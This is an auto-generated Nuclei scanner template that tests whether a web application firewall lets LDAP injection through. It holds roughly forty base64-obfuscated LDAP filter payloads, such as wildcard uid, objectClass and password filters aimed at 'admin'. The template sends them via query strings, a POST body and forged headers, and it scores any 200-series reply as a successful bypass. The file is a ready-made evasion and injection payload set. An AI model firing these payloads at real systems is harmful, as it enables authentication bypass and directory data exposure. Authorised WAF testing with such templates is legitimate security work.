# Generated by obfuskit on 2025-07-25 03:42:37
# WAF Bypass Nuclei Template

id: waf-bypass-ldapi-base64variants

info:
  name: "WAF Bypass - ldapi using Base64Variants"
  author:
    - obfuskit
  severity: high
  description: "WAF bypass for ldapi attacks using Base64Variants evasion techniques"
  tags:
    - waf
    - bypass
    - ldapi
    - base64variants

payloads:
  payload:
    - "KikodWlkPSopKSh8KHVpZD0q"
    - "KikodWlkPSopKSh8KHVpZD0q="
    - "KikodWlkPSopKSh8KHVpZD0"
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9Kg=="
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9Kg"
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9Kg==="
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9Kg="
    - "KikodWlkPSopKSh8KHVpZD0qKSkoJih1aWQ9YWRtaW4p"
    - "KikodWlkPSopKSh8KHVpZD0qKSkoJih1aWQ9YWRtaW4p="
    - "KikodWlkPSopKSh8KHVpZD0qKSkoJih1aWQ9YWRtaW4"
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9KikpKCYob2JqZWN0Q2xhc3M9cGVyc29uKQ=="
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9KikpKCYob2JqZWN0Q2xhc3M9cGVyc29uKQ"
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9KikpKCYob2JqZWN0Q2xhc3M9cGVyc29uKQ==="
    - "Kikob2JqZWN0Q2xhc3M9KikpKHwob2JqZWN0Q2xhc3M9KikpKCYob2JqZWN0Q2xhc3M9cGVyc29uKQ="
    - "YWRtaW4qKSh8KHBhc3N3b3JkPSop"
    - "YWRtaW4qKSh8KHBhc3N3b3JkPSop="
    - "YWRtaW4qKSh8KHBhc3N3b3JkPSo"
    - "KikofChwYXNzd29yZD0qKSkoJih1aWQ9YWRtaW4p"
    - "KikofChwYXNzd29yZD0qKSkoJih1aWQ9YWRtaW4p="
    - "KikofChwYXNzd29yZD0qKSkoJih1aWQ9YWRtaW4"
    - "KikodWlkPSphZG1pbio="
    - "KikodWlkPSphZG1pbio"
    - "KikodWlkPSphZG1pbio=="
    - "Kikob2JqZWN0Q2xhc3M9KnBlcnNvbio="
    - "Kikob2JqZWN0Q2xhc3M9KnBlcnNvbio"
    - "Kikob2JqZWN0Q2xhc3M9KnBlcnNvbio=="
    - "XDI5XDI4dWlkPVwyYVwyOVwyOFw3Y1wyOHVpZD1cMmE="
    - "XDI5XDI4dWlkPVwyYVwyOVwyOFw3Y1wyOHVpZD1cMmE"
    - "XDI5XDI4dWlkPVwyYVwyOVwyOFw3Y1wyOHVpZD1cMmE=="
    - "XDI5XDI4b2JqZWN0Q2xhc3M9XDJhXDI5XDI4XDdjXDI4b2JqZWN0Q2xhc3M9XDJh"
    - "XDI5XDI4b2JqZWN0Q2xhc3M9XDJhXDI5XDI4XDdjXDI4b2JqZWN0Q2xhc3M9XDJh="
    - "XDI5XDI4b2JqZWN0Q2xhc3M9XDJhXDI5XDI4XDdjXDI4b2JqZWN0Q2xhc3M9XDJ"
    - "KikoY249KikpKHwoY249Kg=="
    - "KikoY249KikpKHwoY249Kg"
    - "KikoY249KikpKHwoY249Kg==="
    - "KikoY249KikpKHwoY249Kg="
    - "Kikoc249KikpKHwoc249KiMgOTIxMjAwIExEQVAgSW5qZWN0aW9uIEF0dGFjaw=="
    - "Kikoc249KikpKHwoc249KiMgOTIxMjAwIExEQVAgSW5qZWN0aW9uIEF0dGFjaw"
    - "Kikoc249KikpKHwoc249KiMgOTIxMjAwIExEQVAgSW5qZWN0aW9uIEF0dGFjaw==="
    - "Kikoc249KikpKHwoc249KiMgOTIxMjAwIExEQVAgSW5qZWN0aW9uIEF0dGFjaw="

requests:
  - method: GET
    path:
      - "/?test={{payload}}"
      - "/?q={{payload}}"
      - "/?search={{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

  - method: POST
    path:
      - "/"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "param={{payload}}&test={{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

  - method: GET
    path:
      - "/"
    headers:
      X-Test-Header: "{{payload}}"
      User-Agent: "{{payload}}"
      X-Forwarded-For: "{{payload}}"
      X-Real-IP: "{{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

